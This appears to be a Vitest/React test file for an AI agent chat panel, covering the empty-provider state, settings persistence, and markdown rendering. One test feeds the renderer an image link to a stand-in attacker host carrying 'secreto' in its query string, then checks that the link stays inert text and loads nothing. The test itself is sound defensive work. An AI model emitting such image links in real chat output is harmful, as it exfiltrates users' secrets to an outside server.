import { fireEvent, render, screen } from "@testing-library/react"
import { MemoryRouter } from "react-router-dom"
import { QueryClient, QueryClientProvider } from "@tanstack/react-query"
import AgentPanel from "@/agent/agent-panel"
import { AgentUiContext } from "@/agent/agent-ui"
import { ChatMarkdown } from "@/agent/chat-markdown"
import { saveAgentSettings } from "@/core/agent/provider"

beforeEach(() => localStorage.clear())

test("sin Proveedor: empty state con CTA que abre Ajustes", () => {
  const openSettings = vi.fn()
  render(
    <QueryClientProvider client={new QueryClient()}>
      <MemoryRouter>
        <AgentUiContext.Provider value={{ open: true, setOpen: () => {}, openSettings }}>
          <AgentPanel />
        </AgentUiContext.Provider>
      </MemoryRouter>
    </QueryClientProvider>,
  )
  fireEvent.click(screen.getByRole("button", { name: "Configurar Proveedor" }))
  expect(openSettings).toHaveBeenCalled()
})

test("el chat no carga imágenes remotas: la URL queda como texto inerte", () => {
  const { container } = render(
    <ChatMarkdown>{"hola ![x](https://evil.test/?q=secreto)"}</ChatMarkdown>,
  )
  expect(container.querySelector("img")).toBeNull()
  expect(container).toHaveTextContent("https://evil.test/?q=secreto")
})

test("guardar el Proveedor lo persiste por dispositivo", () => {
  saveAgentSettings({
    providers: [
      {
        id: "p",
        kind: "anthropic",
        name: "A",
        apiKey: "k",
        models: [{ id: "m", visible: true }],
      },
    ],
    active: { providerId: "p", modelId: "m" },
  })
  expect(JSON.parse(localStorage.getItem("bita-agent-provider")!)).toMatchObject({
    active: { modelId: "m" },
  })
})
